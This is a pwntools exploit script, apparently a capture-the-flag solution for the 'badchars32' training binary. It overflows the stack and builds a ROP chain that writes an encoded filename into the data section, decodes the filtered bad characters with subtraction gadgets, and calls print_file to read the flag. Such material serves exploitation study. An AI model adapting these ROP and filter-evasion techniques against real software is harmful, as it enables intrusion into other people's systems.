#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./badchars32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "./badchars32")
context.delete_corefiles = True
context.terminal = ["alacritty", "-e", "sh", "-c"]
rop = ROP(exe)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
break *pwnme+273
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'
# io = start()
# io.sendline(cyclic(100, alphabet="QWERT"))
# io.wait()

# offset = cyclic_find(io.corefile.eip, alphabet="QWERT")
# info(offset)

io = start()

offset = 44

pop_ebx = rop.find_gadget(["pop ebx", "ret"])[0]
pop_ebp = rop.find_gadget(["pop ebp", "ret"])[0]
pop_esi_edi_ebp = rop.find_gadget(["pop esi", "pop edi", "pop ebp", "ret"])[0]
write_edi_esi = 0x0804854F
sub_ebp_ebx = 0x0804854B
data_section = exe.symbols["data_start"]
print_file = exe.symbols["print_file"]

info(data_section)

badChars = ["x", "g", "a", "."]

fileName = "flbh/tyt"
#           01234567


payload = flat(
    offset * b"A",
    pop_esi_edi_ebp,
    fileName[:4],
    data_section,
    data_section,
    write_edi_esi,
    pop_esi_edi_ebp,
    fileName[4:],
    data_section + 0x4,
    data_section,
    write_edi_esi,
    pop_ebx,
    0x1,
    pop_ebp,
    data_section + 0x2,
    sub_ebp_ebx,
    pop_ebp,
    data_section + 0x3,
    sub_ebp_ebx,
    pop_ebp,
    data_section + 0x4,
    sub_ebp_ebx,
    pop_ebp,
    data_section + 0x6,
    sub_ebp_ebx,
    print_file,
    0x0,
    data_section,
)

io.sendline(payload)


io.interactive()
